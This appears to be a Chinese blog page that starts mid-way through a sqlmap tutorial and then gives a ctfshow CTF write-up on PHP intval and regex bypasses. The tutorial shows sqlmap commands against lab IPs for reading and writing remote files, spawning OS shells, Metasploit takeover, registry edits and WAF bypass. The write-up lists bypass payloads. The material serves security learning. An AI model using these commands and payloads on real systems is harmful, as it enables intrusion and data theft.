“<a href="http://192.168.48.130/sqlmap/mysql/get_int.php?id=1%E2%80%9D">http://192.168.48.130/sqlmap/mysql/get_int.php?id=1”</a> –schema–batch –exclude-sysdbs </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020965.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024313.png" alt="img"></p><h3 id="11-2-枚举数据表数量"><a href="#11-2-枚举数据表数量" class="headerlink" title="11.2 枚举数据表数量"></a>11.2 枚举数据表数量</h3><p>如果用户只想知道表中的条目数，则可以使用此开关。 –count</p><p>python sqlmap.py -u “<a href="http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1%E2%80%9D">http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1”</a> –count -D testdb</p><h3 id="11-3-获取数据信息"><a href="#11-3-获取数据信息" class="headerlink" title="11.3 获取数据信息"></a>11.3 获取数据信息</h3><p>–start, –stop, –first, –last</p><p>–start 1 –stop3 获取第二张到第三张表的名字 –stop 1 获取第一张表的名字 –first 3 –last 5 获取从第三出发到第五个字符</p><h3 id="11-4-设置条件获取信息"><a href="#11-4-设置条件获取信息" class="headerlink" title="11.4 设置条件获取信息"></a>11.4 设置条件获取信息</h3><p>–pivot-column&#x3D;id 设置独一无二的列 –where&#x3D;“id&gt;3” 设置条件 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020507.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020887.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020079.png" alt="img"></p><h3 id="11-5-暴力激活成功教程数据"><a href="#11-5-暴力激活成功教程数据" class="headerlink" title="11.5 暴力激活成功教程数据"></a>11.5 暴力激活成功教程数据</h3><p>使用场景：Mysql&lt;5.0时，Mysql中没有元数据库 information_schema。 –common-tables 暴力激活成功教程表名 –common-columns 暴力激活成功教程列名</p><h3 id="11-6-读取文件"><a href="#11-6-读取文件" class="headerlink" title="11.6 读取文件"></a>11.6 读取文件</h3><p>前提：已知目标主机文件路径 –file-read 路径 读取对应文件内容。 注意：此处路径为绝对路径。（需要使用&#x2F;&#x2F;,其中一个&#x2F;表示转义） </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024417.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024620.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024330.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024519.png" alt="img"></p><h3 id="11-7-写入文件"><a href="#11-7-写入文件" class="headerlink" title="11.7 写入文件"></a>11.7 写入文件</h3><p>–file-write 读取本地文件 –file-dest 将读取到的文件写入到远程绝对路径 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020518.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025438.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020987.png" alt="img"></p><h3 id="11-8-检索所有信息"><a href="#11-8-检索所有信息" class="headerlink" title="11.8 检索所有信息"></a>11.8 检索所有信息</h3><p>-a –all </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020256.png" alt="img"></p><h2 id="0x0C-sqlmap-系统参数"><a href="#0x0C-sqlmap-系统参数" class="headerlink" title="0x0C sqlmap 系统参数"></a>0x0C sqlmap 系统参数</h2><h3 id="12-1-执行系统命令"><a href="#12-1-执行系统命令" class="headerlink" title="12.1 执行系统命令"></a>12.1 执行系统命令</h3><p>前提条件：</p><ol><li>网站必须是root权限</li><li>攻击者需要知道网站的绝对路径</li><li>GPC为off（即magic_quotes_gpc &#x3D; off），php主动转义的功能关闭</li><li>若需要上传文件，则secure_file_priv 不为NULL</li></ol><p>–os-shell</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025967.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020059.png" alt="img"></p><h3 id="12-2-结合Metasploit"><a href="#12-2-结合Metasploit" class="headerlink" title="12.2 结合Metasploit"></a>12.2 结合Metasploit</h3><p>python sqlmap.py -u “注入点” –os-pwn –msf-path (若不使用该参数，则自动选择默认路径) （只适用于MySQL and PostgreSQL 数据库）</p><h3 id="12-3-注册表介绍"><a href="#12-3-注册表介绍" class="headerlink" title="12.3 注册表介绍"></a>12.3 注册表介绍</h3><p>注册表（Registry，繁体中文版Windows操作系统称之为登录档）是Microsoft Windows中的一个重要的数据库，用于存储系统和应用程序的设置信息。早在Windows 3.0推出OLE技术的时候，注册表就已经出现。随后推出的Windows NT是第一个从系统级别广泛使用注册表的操作系统。但是，从Microsoft Windows 95操作系统开始，注册表才真正成为Windows用户经常接触的内容，并在其后的操作系统中继续沿用至今。 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020490.png" alt="img"></p><h3 id="12-4-注册表操作"><a href="#12-4-注册表操作" class="headerlink" title="12.4 注册表操作"></a>12.4 注册表操作</h3><p>–reg-read –reg-add –reg-del –reg-key, –reg-value, –reg-data –reg-type</p><p>例如： $ python sqlmap.py -u <a href="http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1">http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1</a> –reg-add –reg-key&#x3D;“HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap” –reg-value&#x3D;Test –reg-type&#x3D;REG_SZ –reg-data&#x3D;1</p><h2 id="0x0D-sqlmap-通用参数（一）"><a href="#0x0D-sqlmap-通用参数（一）" class="headerlink" title="0x0D sqlmap 通用参数（一）"></a>0x0D sqlmap 通用参数（一）</h2><h3 id="13-1-加载-sqlite-会话文件"><a href="#13-1-加载-sqlite-会话文件" class="headerlink" title="13.1 加载 sqlite 会话文件"></a>13.1 加载 sqlite 会话文件</h3><p>sqlmap自动为每个目标创建持久会话SQLite文件，位于专用输出目录中，其中存储会话恢复所需的所有数据。如果用户想显式地设置会话文件位置(例如在一个位置为多个目标存储会话数据)，可以使用此选项。</p><p>-s “会话文件”</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025437.png" alt="img"></p><h3 id="13-2-加载-http-文本文件"><a href="#13-2-加载-http-文本文件" class="headerlink" title="13.2 加载 http 文本文件"></a>13.2 加载 http 文本文件</h3><p>这个选项需要指定文本文件的参数来写入sqlmap – HTTP(s)请求和HTTP(s)响应生成的所有HTTP(s)流量。 这主要用于调试目的——当您向开发人员提供一个潜在的bug报告时，也发送这个文件。 -t 参数 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020819.png" alt="img"></p><h3 id="13-3-设置默认选择选项"><a href="#13-3-设置默认选择选项" class="headerlink" title="13.3 设置默认选择选项"></a>13.3 设置默认选择选项</h3><p>如果希望sqlmap作为批处理工具运行，在sqlmap需要时不需要任何用户交互，那么可以使用—–batch来强制执行。这将使sqlmap在需要用户输入时保持默认行为。</p><h3 id="13-4-执行系统命令"><a href="#13-4-执行系统命令" class="headerlink" title="13.4 执行系统命令"></a>13.4 执行系统命令</h3><p>–os-cmd&#x3D;”命令” </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025236.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020532.png" alt="img"></p><h3 id="13-5-设置盲注字符集"><a href="#13-5-设置盲注字符集" class="headerlink" title="13.5 设置盲注字符集"></a>13.5 设置盲注字符集</h3><p>在基于布尔和基于时间的SQL盲注中，用户可以强制使用自定义字符集来加速数据检索过程。</p><p>例如，如果转储消息摘要值(例如SHA1)，则使用–charset&#x3D;“0123456789abcdef”，预期请求数量比正常运行少30%左右 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025360.png" alt="img"></p><h3 id="13-6-爬取-URL"><a href="#13-6-爬取-URL" class="headerlink" title="13.6 爬取 URL"></a>13.6 爬取 URL</h3><p>sqlmap可以通过从目标位置开始收集链接(爬行)来收集潜在的脆弱链接。使用此选项，用户可以设置一个深度(到起始位置的距离)，低于这个深度，sqlmap不会进入收集阶段，因为只要有新的链接要访问，就会递归地执行这个过程。 –crawl python sqlmap.py -u “<a href="http://192.168.21.128/sqlmap/mysql/%E2%80%9D">http://192.168.21.128/sqlmap/mysql/”</a> –batch –crawl&#x3D;3 –crawl-exclude 字符串 存在字符串的URL不进行爬取</p><h3 id="13-7-在-CSV-输入中使用的分割字符"><a href="#13-7-在-CSV-输入中使用的分割字符" class="headerlink" title="13.7 在 CSV 输入中使用的分割字符"></a>13.7 在 CSV 输入中使用的分割字符</h3><p>当被转储的<a href="https://cloud.tencent.com/product/cos?from_column=20065&from=20065">数据存储</a>到CSV格式(–dump-format&#x3D;CSV)时，条目必须用“分离值”分隔(默认值是 ”，”)。如果用户想要覆盖它的默认值，他可以使用这个选项(例如–csv-del&#x3D;”@”)。 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025576.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020699.png" alt="img"></p><h3 id="13-8-设置输出格式"><a href="#13-8-设置输出格式" class="headerlink" title="13.8 设置输出格式"></a>13.8 设置输出格式</h3><p>当将转储表数据存储到输出目录中的相应文件中时，sqlmap支持三种不同的格式:CSV、HTML和SQLITE。默认的是CSV，其中每个表行一行一行地存储在文本文件中，每个条目用逗号分隔(或提供了选项–csv-del)。对于HTML，输出被存储到一个HTML文件中，其中每一行都用格式化表中的一行表示。对于SQLITE，输出存储在SQLITE数据库中，原始表内容复制到同名的相应表中。</p><p>–dump-format</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020870.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025291.png" alt="img"></p><h3 id="13-9-探测之前检测-Internet-连接"><a href="#13-9-探测之前检测-Internet-连接" class="headerlink" title="13.9 探测之前检测 Internet 连接"></a>13.9 探测之前检测 Internet 连接</h3><p>在进行评估目标之前，检测当前计算机Internet连接是否正常。确保探测失败不是因为网路拦截问题。</p><p>–check-internet </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020547.png" alt="img"></p><h3 id="13-10-解析和测试表单的输入字段"><a href="#13-10-解析和测试表单的输入字段" class="headerlink" title="13.10 解析和测试表单的输入字段"></a>13.10 解析和测试表单的输入字段</h3><p>–form </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020372.png" alt="img"></p><h2 id="0x0E-sqlmap-通用参数（二）"><a href="#0x0E-sqlmap-通用参数（二）" class="headerlink" title="0x0E sqlmap 通用参数（二）"></a>0x0E sqlmap 通用参数（二）</h2><h3 id="14-1-设置预计完成时间"><a href="#14-1-设置预计完成时间" class="headerlink" title="14.1 设置预计完成时间"></a>14.1 设置预计完成时间</h3><p>可以实时地计算和显示估计的到达时间，以检索每个查询输出。当用于检索输出的技术是任何盲SQL注入类型时，就会显示这一点。 –eta </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025872.png" alt="img"></p><h3 id="14-2-刷新会话文件"><a href="#14-2-刷新会话文件" class="headerlink" title="14.2 刷新会话文件"></a>14.2 刷新会话文件</h3><p>由于会话文件的概念，所以最好知道您可以使用选项–flush-session刷新该文件的内容。通过这种方式，您可以避免sqlmap中默认实现的缓存机制。其他可能的方法是手动删除会话文件。</p><h3 id="14-3-忽略会话中的存储结果"><a href="#14-3-忽略会话中的存储结果" class="headerlink" title="14.3 忽略会话中的存储结果"></a>14.3 忽略会话中的存储结果</h3><p>使用选项–fresh-queries来忽略该文件的内容。通过这种方式，可以保持会话文件不变，对于所选的运行，避免恢复&#x2F;恢复查询输出。</p><h3 id="14-4-使用-Hex-函数检索数据"><a href="#14-4-使用-Hex-函数检索数据" class="headerlink" title="14.4 使用 Hex 函数检索数据"></a>14.4 使用 Hex 函数检索数据</h3><p>非ascii数据的检索需要特殊的需求。解决这个问题的一个方法是使用DBMS hex函数。数据在被检索之前被编码为十六进制形式，然后被未编码为原始形式。</p><p>–hex</p><p>例如： python sqlmap.py -u “<a href="http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1%E2%80%9D">http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1”</a> –hex -v 3 –batch</p><h3 id="14-5-设置自定义输出路径"><a href="#14-5-设置自定义输出路径" class="headerlink" title="14.5 设置自定义输出路径"></a>14.5 设置自定义输出路径</h3><p>sqlmap默认将会话和结果文件存储在子目录输出中。如果您想使用不同的位置，可以使用这个选项(例如–output-dir&#x3D;&#x2F;tmp)。</p><h3 id="14-6-从响应页面解析错误"><a href="#14-6-从响应页面解析错误" class="headerlink" title="14.6 从响应页面解析错误"></a>14.6 从响应页面解析错误</h3><p>如果web应用程序配置为调试模式，以便在HTTP响应中显示后端数据库管理系统错误消息，sqlmap可以解析并显示它们。这对于调试很有用，比如理解为什么某个枚举或接管开关不起作用——这可能与会话用户的特权有关 –parse-error</p><p>保存Sqlmap配置文件 –save 可以将命令行选项保存到配置INI文件中。然后，可以使用之前解释的-c选项编辑生成的文件并将其传递给sqlmap。</p><p>更新Sqlmap –update</p><h3 id="14-7-强制设置-DBMS-编码"><a href="#14-7-强制设置-DBMS-编码" class="headerlink" title="14.7 强制设置 DBMS 编码"></a>14.7 强制设置 DBMS 编码</h3><p>–encoding&#x3D;”gbk” </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025767.png" alt="img"></p><h3 id="14-8-存储-HTTP-流量到-HAR"><a href="#14-8-存储-HTTP-流量到-HAR" class="headerlink" title="14.8 存储 HTTP 流量到 HAR"></a>14.8 存储 HTTP 流量到 HAR</h3><p>–har&#x3D;”HARFILE” HAR（HTTP Archive），是一个用来储存HTTP请求&#x2F;响应信息的通用文件格式，基于JSON。 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020937.png" alt="img"></p><h3 id="14-9-筛选具体-Payload"><a href="#14-9-筛选具体-Payload" class="headerlink" title="14.9 筛选具体 Payload"></a>14.9 筛选具体 Payload</h3><p>–test-filter&#x3D;”ROW” </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025817.png" alt="img"></p><h3 id="14-10-过滤具体-Payload"><a href="#14-10-过滤具体-Payload" class="headerlink" title="14.10 过滤具体 Payload"></a>14.10 过滤具体 Payload</h3><p>–test-skip&#x3D;”BENCHMARK” </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020843.png" alt="img"></p><p> <strong>补充：</strong> 针对proxy日志文件使用正则表达式筛选目标 –scope&#x3D;”regex”</p><h2 id="0x0F-sqlmap-杂项参数"><a href="#0x0F-sqlmap-杂项参数" class="headerlink" title="0x0F sqlmap 杂项参数"></a>0x0F sqlmap 杂项参数</h2><h3 id="15-1-使用缩写助记符"><a href="#15-1-使用缩写助记符" class="headerlink" title="15.1 使用缩写助记符"></a>15.1 使用缩写助记符</h3><p>Sqlmap提供灵活的缩写助记符来进行快速书写命令。 -z 参数</p><p>例如： python sqlmap.py –batch –random-agent –ignore-proxy –technique&#x3D;BEU -u<a href="http://www.target.com/vuln.php?id=1%E2%80%B3">www.target.com/vuln.php?id=1″</a></p><p>使用助记符： python sqlmap.py -z “bat,randoma,ign,tec&#x3D;BEU” -u “<a href="http://www.target.com/vuln.php?id=1%E2%80%9D">www.target.com/vuln.php?id=1”</a></p><h3 id="15-2-设置探测预警"><a href="#15-2-设置探测预警" class="headerlink" title="15.2 设置探测预警"></a>15.2 设置探测预警</h3><p>在发现SQL注入漏洞时，运行本机主机系统命令 –alert </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020505.png" alt="img"></p><h3 id="15-3-设置问题答案"><a href="#15-3-设置问题答案" class="headerlink" title="15.3 设置问题答案"></a>15.3 设置问题答案</h3><p>如果用户想自动设置问题的答案，即使使用–batch，使用–answers，通过在等号后面提供问题的任何部分和答案来完成。另外，不同问题的答案可以用分隔符分隔。</p><p>例如： python sqlmap.py -u “<a href="http://192.168.22.128/sqlmap/mysql/get_int.php?id=1%E2%80%9D%E2%80%93technique=E">http://192.168.22.128/sqlmap/mysql/get_int.php?id=1”–technique=E</a> –answers&#x3D;“extending&#x3D;N” –batch</p><h3 id="15-4-发现-SQL-注入预警"><a href="#15-4-发现-SQL-注入预警" class="headerlink" title="15.4 发现 SQL 注入预警"></a>15.4 发现 SQL 注入预警</h3><p>如果用户使用–beep，当发现SQL注入时，会立即发出哔哔的警告。这在需要测试的大量目标url(选项-m)时特别有用。</p><h3 id="15-5-其他"><a href="#15-5-其他" class="headerlink" title="15.5 其他"></a>15.5 其他</h3><p>–cleanup 清除DBMS udf创建的数据表 –dependencies 查看依赖项 –disable-coloring 不进行高亮显示 –identify-waf 查看是否具有WAF保护 –moblie 使用手机端User-Agent –purge-output 清除output目录下的文件 –skip-waf 绕过WAF –sqlmap-shell 使用sqlmap shell –tmp-dir&#x3D;TMPDIR 指定本地目录用来存储临时文件 –web-root&#x3D;WEBROOT 指定站点根目录 –wizard 使用向导式的sqlmap –gpage&#x3D;GOOGLEPAGE 设置Google Dork的页码数</p><p>–smart 智能探测 有些情况下，用户有大量的潜在目标URL（例如，提供了选项 -m），希望尽快找到一个脆弱的目标。如果使用—smart，那么将在扫描中进一步使用数据库管理系统错误的参数，否则就跳过它们</p><h2 id="0x10-常用-Tamper-脚本"><a href="#0x10-常用-Tamper-脚本" class="headerlink" title="0x10 常用 Tamper 脚本"></a>0x10 常用 Tamper 脚本</h2><p>这里推荐几篇比较详细的文章去学习： <a href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://www.cnblogs.com/mark0/p/12349551.html&objectId=2148285&objectType=1&contentType=undefined">https://www.cnblogs.com/mark0/p/12349551.html</a></p><p><a href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://blog.csdn.net/qq_34444097/article/details/82717357?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522159341834119725219951313%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=159341834119725219951313&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~pc_rank_v3-5-82717357.first_rank_ecpm_v1_pc_rank_v3&utm_term=sqlmap%20tamper%E8%84%9A%E6%9C%AC&objectId=2148285&objectType=1&contentType=undefined">https://blog.csdn.net/qq_34444097&#x2F;article&#x2F;details&#x2F;82717357?ops_request_misc&#x3D;%257B%2522request%255Fid%2522%253A%2522159341834119725219951313%2522%252C%2522scm%2522%253A%252220140713.130102334…%2522%257D&amp;request_id&#x3D;159341834119725219951313&amp;biz_id&#x3D;0&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2allfirst_rank_ecpm_v1~pc_rank_v3-5-82717357.first_rank_ecpm_v1_pc_rank_v3&amp;utm_term&#x3D;sqlmap+tamper脚本</a></p><blockquote><p> 版权声明：本文内容由互联网用户自发贡献，该文观点仅代表作者本人。本站仅提供信息存储空间服务，不拥有所有权，不承担相关法律责任。如发现本站有涉嫌侵权&#x2F;违法违规的内容， 请发送邮件至 举报，一经查实，本站将立刻删除。 </p><p>发布者：全栈程序员栈长，转载请注明出处：<a href="https://javaforall.cn/200744.html%E5%8E%9F%E6%96%87%E9%93%BE%E6%8E%A5%EF%BC%9Ahttps://javaforall.cn">https://javaforall.cn/200744.html原文链接：https://javaforall.cn</a></p></blockquote><h1 id="4、PHP特性"><a href="#4、PHP特性" class="headerlink" title="4、PHP特性"></a>4、PHP特性</h1><h4 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>])) &#123;<span class="hljs-comment">//传入num</span><br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<span class="hljs-comment">//将num的值赋给$num</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[0-9]/&quot;</span>, <span class="hljs-variable">$num</span>)) &#123;<span class="hljs-comment">//检查 $num 是否包含数字字符</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<span class="hljs-comment">//若匹配到数字，脚本终止并输出 no no no!</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<span class="hljs-comment">//将 $num 转换为整数，若结果非零则输出 $flag</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>根据intval()的特性：intval($num)为真，获取flag</p><p>可以输入数组：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?num[]=1<br></code></pre></td></tr></table></figure><p>获得了flag</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022030559.png"></p><p>补充知识：</p><p><code>intval()</code>函数用于将变量转换为整数。其行为根据输入类型的不同而变化，</p><p><strong>1. 基本语法</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-keyword">mixed</span> <span class="hljs-variable">$value</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$base</span> = <span class="hljs-number">10</span>): <span class="hljs-keyword">int</span><br></code></pre></td></tr></table></figure><p><code>$value</code>：要转换的变量（支持所有数据类型）</p><p><code>$base</code>：转化所使用的进制（默认10，仅对字符串有效）</p><p><strong>2. 不同数据类型的转换规则</strong></p><p><strong>2.1 字符串</strong></p><p>尝试提取开头的数字部分，忽略后续非数字字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">intval(&quot;123&quot;);      // 123<br>intval(&quot;45.67&quot;);    // 45（浮点截断）<br>intval(&quot;123abc&quot;);   // 123（忽略字母）<br>intval(&quot;abc123&quot;);   // 0（开头无数字）<br></code></pre></td></tr></table></figure><p><strong>2.2 浮点数</strong></p><p>直接截断小数部分。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">intval(3.14);       // 3<br>intval(-2.718);     // -2<br></code></pre></td></tr></table></figure><p><strong>2.3 布尔</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">intval(true);       // 1<br>intval(false);      // 0<br></code></pre></td></tr></table></figure><p><strong>2.4 数组</strong></p><p>空数组（<code>[]</code>） –&gt; 0</p><p>非空数组（至少一个元素） –&gt; 1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">intval([]);         // 0<br>intval([&quot;a&quot;]);      // 1<br>intval([0, 1]);     // 1（与元素内容无关）<br></code></pre></td></tr></table></figure><p><strong>2.5 对象</strong></p><p>不能用于 object，否则会产生 E_NOTICE 错误并返回 1</p><p><strong>2.6 NULL</strong></p><p>始终返回 0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">intval(null);       // 0<br></code></pre></td></tr></table></figure><h4 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>])) &#123;<span class="hljs-comment">//检查是否存在num的GET参数</span><br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<span class="hljs-comment">//将GET参数num的值赋给变量$num</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$num</span> === <span class="hljs-string">&quot;4476&quot;</span>) &#123;<span class="hljs-comment">//比较$num是否等于字符串&quot;4476&quot;，若成立则终止脚本</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>, <span class="hljs-number">0</span>) === <span class="hljs-number">4476</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<span class="hljs-comment">//将$num转换为整数（自动检测进制），若结果为4476，则输出$flag</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>当num为4476时输出no no no！</p><p>当num的整数部分为4476时得到flag</p><p>$num 为 “4476a”（不全等于 “4476”），绕过 die()</p><p>intval(“4476a”, 0) → 4476，触发 echo $flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">payload:（都可以绕过）<br>?num=4476a      # 附加字母<br>?num=4476%20    # 附加空格（URL编码）<br>?num=4476.0     # 浮点表示<br>?num=4476e0     # 科学计数法<br>?num=0x117c     # 十六进制<br>?num=010574 # 八进制<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022030738.png"></p><h4 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^php$/im&#x27;</span>, <span class="hljs-variable">$a</span>))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^php$/i&#x27;</span>, <span class="hljs-variable">$a</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hacker&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nonononono&#x27;</span>;<br>&#125; 